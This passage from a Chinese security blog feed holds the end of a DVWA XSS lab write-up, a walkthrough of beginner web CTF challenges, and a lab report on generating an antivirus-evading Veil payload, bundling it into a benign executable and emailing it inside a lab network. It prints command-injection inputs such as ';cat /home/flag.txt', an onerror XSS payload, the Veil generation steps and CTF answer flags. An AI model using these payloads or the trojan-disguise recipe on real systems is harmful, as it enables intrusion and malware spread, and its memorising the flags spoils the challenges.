class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里同反射型xss一样，既然屏蔽了script，那么我们可以通过其他的标签来实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;&quot;</span> onerror=<span class="string">&quot;alert(&#x27;1&#x27;);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对<code>message</code>和<code>name</code>都通过<code>htmlspecialchars()</code>进行了html实体的转义，因此不存在xss注入。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web新手题wp汇总</title>
      <link href="2020/02/09/20200208181201/"/>
      <url>2020/02/09/20200208181201/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-view-source"><a href="#0x00-view-source" class="headerlink" title="0x00 view_source"></a>0x00 view_source</h1><p>题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209181517950.png" alt="image-20200209181517950" style="zoom:50%;"><p>直接打开网站，<code>F12</code>查看源代码，发现<code>flag</code>：<code>cyberpeace&#123;d54ad4fdb3a258685cbd1fd82817c5a5&#125;</code>。</p><h1 id="0x01-robots"><a href="#0x01-robots" class="headerlink" title="0x01 robots"></a>0x01 robots</h1><p>题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p><p>分析描述，可以知道存在<code>robots.txt</code>文件，打开发现</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209181855676.png" alt="image-20200209181855676" style="zoom:50%;"><p>可知道有文件<code>flag_ls_h3re.php</code>，直接打开该文件得到<code>flag</code>：<code>cyberpeace&#123;165ec629b3fbc11e0b229a9a3c7283a6&#125;</code>。</p><h1 id="0x02-backup"><a href="#0x02-backup" class="headerlink" title="0x02 backup"></a>0x02 backup</h1><p>题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p><p>分析描述：php的备份文件有两种：<code>*.php~</code>和<code>*.php.bak</code>。</p><p>分别打开这两个文件，可以下载到<code>index.php.bak</code>文件，打开找到<code>flag</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;备份文件&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;http:&#x2F;&#x2F;libs.baidu.com&#x2F;bootstrap&#x2F;3.0.3&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; &#x2F;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            margin-left:auto;</span><br><span class="line">            margin-right:auto;</span><br><span class="line">            margin-TOP:200PX;</span><br><span class="line">            width:20em;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;你知道index.php的备份文件名吗？&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-cookie"><a href="#0x03-cookie" class="headerlink" title="0x03 cookie"></a>0x03 cookie</h1><p>题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p><p>分析描述，发现这道题目是要找cookie。访问靶机，<code>F12</code>在network中查看<code>response</code>头。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209182908214.png" alt="image-20200209182908214" style="zoom: 33%;"><p>发现<code>Set-Cookie: look-here=cookie.php</code>，因此我们访问<code>cookie.php</code>。让我们查看<code>response</code>。找到<code>flag</code>：<code>cyberpeace&#123;1b0103c4937fa3d11fc2d535cd5836bd&#125;</code>。</p><h1 id="0x04-disabled-button"><a href="#0x04-disabled-button" class="headerlink" title="0x04 disabled_button"></a>0x04 disabled_button</h1><p>题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><p>打开目标网页，<code>f12</code>打开源代码发现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">disabled</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:50px;width:200px;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将disabled属性删除后，发现按钮可以点击，获取<code>flag</code>：<code>cyberpeace&#123;6c7f92cbdd9571b6cf10ffb26846022f&#125;</code>。</p><h1 id="0x05-weak-auth"><a href="#0x05-weak-auth" class="headerlink" title="0x05 weak_auth"></a>0x05 weak_auth</h1><p>题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。</p><p>打开网页，发现是一个登录页面，结合描述，认为是弱口令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一次测试</span></span><br><span class="line">username = <span class="number">111</span></span><br><span class="line">password = <span class="number">111</span></span><br><span class="line"><span class="comment"># 返回信息：please login as admin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次测试</span></span><br><span class="line">username = admin</span><br><span class="line">password = admin</span><br><span class="line"><span class="comment"># 返回信息：password error</span></span><br></pre></td></tr></table></figure><p>现在，我们可以确定账户为<code>admin</code>。</p><p>现在我们可以通过弱口令工具爆破该密码。</p><p><a href="https://github.com/yzddmr6/WebCrack">WebCrack</a></p><p>具体的使用方法该工具的<code>README.md</code>中有，这里不再赘述。</p><p>跑出来，发现账号密码为：<code>admin/123456</code>。登录，得到<code>flag：cyberpeace&#123;10d2ccedf1e3b82ef0e773e776e81386&#125;</code>。</p><h1 id="0x06-simple-php"><a href="#0x06-simple-php" class="headerlink" title="0x06 simple_php"></a>0x06 simple_php</h1><p>题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p><p>打开网页发现php源码，<code>$a</code>和<code>$b</code>是通过<code>$_GET[]</code>得到的，所以可以在url中构造参数。</p><p>分析该题是php弱类型比较，<code>a==0</code>返回真，输出<code>$flag1</code>,<code>4444a</code>绕过<code>is_numeric</code>，并且大于1234，输出<code>$flag2</code>，得到<code>flag:Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;</code>。</p><h1 id="0x07-get-post"><a href="#0x07-get-post" class="headerlink" title="0x07 get_post"></a>0x07 get_post</h1><p>题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p><p>首先，明白两种提交方式：GET和POST。</p><p>GET方法提交时，参数会直接跟在url后面，例如：<code>www.xxx.com/?a=1&amp;b=2&amp;c=3</code>各参数用<code>&amp;</code>连接。</p><p>POST方法提交时，参数不会出现在url中，而是会以键值对的方式跟在请求头后面。</p><p>打开网页，提示以GET方式提交变量a，值为1，因此在url后添加<code>?a=1</code>。之后提示以POST请求提交变量b，值为2，这时通过chrome插件<code>hackbar</code>以POST方式提交b=2的请求，获取<code>flag：cyberpeace&#123;dbbf28d1d2855295e7e749e836df3f6e&#125;</code>。</p><h1 id="0x08-xff-referer"><a href="#0x08-xff-referer" class="headerlink" title="0x08 xff_referer"></a>0x08 xff_referer</h1><p>题目描述：X老师告诉小宁其实xff和referer是可以伪造的。</p><p>首先要明白xff和referer。</p><p>xff：x-forwarded-for，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>referer：告诉服务器该网页是从哪个页面链接过来的。</p><p>打开网页，提示IP地址必须为123.123.123.123，因此在请求头中添加x-forwarded-for:123.123.123.123。提交请求，提示必须来自<code>https://www.google.com</code>，因此请求头中添加referee：<code>https://www.google.com</code>，得到<code>flag：cyberpeace&#123;b6aaf4c55f9cf5644e135c3b47a2f8d7&#125;</code>。</p><p>本题通过chrome插件<code>modheader</code>实现对http header的修改。</p><h1 id="0x09-webshell"><a href="#0x09-webshell" class="headerlink" title="0x09 webshell"></a>0x09 webshell</h1><p>题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p><p>由题目可知，已经有了一句话木马了，现在只需要会连接就可以。</p><p>可以用<a href="https://github.com/AntSwordProject">蚁剑</a>连接，这里不介绍具体用法。</p><p>我们这里用chrome插件<code>hackbar</code>提交POST请求获取flag。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209203145845.png" alt="image-20200209203145845" style="zoom:33%;"><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209203233599.png" alt="image-20200209203233599" style="zoom:25%;"><p><code>flag:cyberpeace&#123;fc2722f9d8c0a4ab3f099176c486ac61&#125;</code></p><h1 id="0x10-command-execution"><a href="#0x10-command-execution" class="headerlink" title="0x10 command_execution"></a>0x10 command_execution</h1><p>题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><p>打开网页发现可以直接执行命令，通过<code>;</code>可以执行多个命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 首先找到flag.txt文件的位置</span></span><br><span class="line">;find / -name flag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 返回：/home/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看flag.txt内容</span></span><br><span class="line">;cat /home/flag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 返回：cyberpeace&#123;f48d4d8ec8bc8697ab114c130789493f&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x11-simple-js"><a href="#0x11-simple-js" class="headerlink" title="0x11 simple_js"></a>0x11 simple_js</h1><p>题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</p><p>打开网页，<code>F12</code>打开源码，发现js源码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> tab2 = pass.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = tab.length;</span><br><span class="line">    k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">        o = tab[i-l];</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">        o = tab[i-l];</span><br><span class="line">        <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span><br><span class="line">            p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]); </span><br><span class="line">    pass = p;<span class="keyword">return</span> pass;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](dechiffre(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span><br><span class="line">h = <span class="built_in">window</span>.prompt(<span class="string">&#x27;Enter password&#x27;</span>);</span><br><span class="line">alert( dechiffre(h) );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该题为js代码审计，简化上面的代码可得：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> tab2 = pass.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++ )&#123;</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode(tab2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]); </span><br><span class="line">    pass = p;<span class="keyword">return</span> pass;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](dechiffre(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span><br><span class="line">h = <span class="built_in">window</span>.prompt(<span class="string">&#x27;Enter password&#x27;</span>);</span><br><span class="line">alert( dechiffre(h) );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现无论输入什么，最后返回的值永远都是tab2，也就是pass处理后的值，而真正的flag是<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>。通过脚本跑出<code>flag</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#x27;</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2020/02/09/20200208181201/image-20200209212846303.png" alt="image-20200209212846303"></p><p><code>flag：Cyberpeace&#123;786OsErtk12&#125;</code></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若有web大佬看见，有任何建议都可以相互交流一下，江小白在这里拜谢。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次小小的社工行动</title>
      <link href="2020/02/05/20200205215523/"/>
      <url>2020/02/05/20200205215523/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次小小的社工行动"><a href="#记一次小小的社工行动" class="headerlink" title="记一次小小的社工行动"></a>记一次小小的社工行动</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着一个多月的时间，实验室渗透测试的任务随着A组大佬打通关，从远程的渗透工作也算是有了一个比较完美的结束。收集到了扫描、攻击等信息。为了丰富收集的攻击数据的完整性，因此随后开展了在3网段的社工攻击，以丰富收集到的攻击数据，为之后的知识图谱的构建打好基础。</p><h2 id="技术手段"><a href="#技术手段" class="headerlink" title="技术手段"></a>技术手段</h2><p>主要技术</p><table><thead><tr><th align="center"><strong>技术</strong></th><th>描述</th></tr></thead><tbody><tr><td align="center">veil-evasion</td><td>一个生成木马工具，有着不少的payload和生成方式使用。</td></tr><tr><td align="center">pyjoiner</td><td>github上一个开源的项目，用以进行两个exe文件的捆绑，对后门木马进行一定的伪装，在传播过程中，减少被发现几率。</td></tr></tbody></table><h3 id="veil-evasion"><a href="#veil-evasion" class="headerlink" title="veil-evasion"></a>veil-evasion</h3><p>Veil Evasion是一个可执行文件，它被用来生成Metasploit的payload，能绕过常见杀软。</p><p>Veil-Evasion被原生设计为在kali上，但其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把payload文件用Pyinstaller或者Py2Exe转为可执行文件。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115154354408.png" alt="image-20200115154354408" style="zoom:25%;"><p>在本次前期的渗透过程中，我们尝试的29号payload<code>python/shellcode_inject/aes_encrypt.py</code>的免杀效果最好，因此在本次的社工，通过邮件、布谷鸟扩散的后门木马就使用这个。在实际的测试当中，发现在win10中的效果也是不错的。</p><p>下面贴出生成命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 打开veil</span></span><br><span class="line">veil</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 选择evasion</span></span><br><span class="line">use 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 选择29号payload</span></span><br><span class="line">use 29</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用python加密</span></span><br><span class="line">set USE_PYTHON Y</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始生成</span></span><br><span class="line">generate</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 选择msfvenom</span></span><br><span class="line">use 2</span><br></pre></td></tr></table></figure><p>之后一路回车，中间填写输出文件名、监听IP地址、监听端口。</p><h3 id="pyjoiner"><a href="#pyjoiner" class="headerlink" title="pyjoiner"></a>pyjoiner</h3><p>是一个<code>github</code>上的开源项目，地址为</p><p>有两个版本，一个是32位kali的版本，另一个是win下的带图形界面的版本。</p><p>在这里我们选择win下的版本。</p><blockquote><p>windows版本：windows 10</p><p>python版本： 3.4.4</p><p>pyinstaller版本： 3.3.1</p></blockquote><p>以上是本次pyjoiner的运行环境。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160029085.png" alt="image-20200115160029085" style="zoom:50%;"><p>down下来<code>pyjoiner</code>后，打开文件夹，在该位置下打开<code>cmd</code>运行<code>python pyJoiner.py</code>，出现图形化界面。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160340504.png" alt="image-20200115160340504" style="zoom:40%;"><p>傻瓜式操作选择被捆绑程序和后门程序。这里我们选取了自写的一个qt程序和veil生成的后门。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160744854.png" alt="image-20200115160744854" style="zoom:50%;"><p>运行后：</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160823488.png" alt="image-20200115160823488" style="zoom:50%;"><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160945380.png" alt="image-20200115160945380" style="zoom:50%;"><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/image-20200115160956380.png" alt="image-20200115160956380" style="zoom:50%;"><p>发现在后台启动了两个进程，分别为被捆绑的正常软件和后门程序。实现了对后门的隐藏。</p><blockquote><p>之后想到了更加好的隐藏办法，将后门捆绑在windows自带的小游戏下，这样的隐藏效果会更好。</p></blockquote><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>将事先准备好的<code>小蘑菇.exe</code>通过布谷鸟和邮件的方式进行在内网下的传播，并在<code>kali</code>上开启监听。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/截屏2020-01-15上午10.32.26.png" style="zoom:50%;"><p>最后的效果很好，反弹回了一堆<code>session</code>，其中挑几个，查看其中flag和getuid。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/截屏2020-01-15上午10.32.42.png" style="zoom:50%;"><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/截屏2020-01-15上午10.34.16.png" style="zoom:50%;"><img src= "/img/loading.gif" data-lazy-src="/2020/02/05/20200205215523/截屏2020-01-15上午10.35.39.png" style="zoom:50%;"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这次的社工中，主要的目的针对了对传播木马的伪造效果，对社工的具体的利用方式还有待加强，没有达到一个正真的外部人员对一个内网用户真实的社工状态，这可能跟我们本来就是内部人员有关吧:joy:。希望各位大佬能够给予一些建议:innocent:。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>木马概述</title>
      <link href="2020/02/05/20200205214405/"/>
      <url>2020/02/05/20200205214405/</url>
      
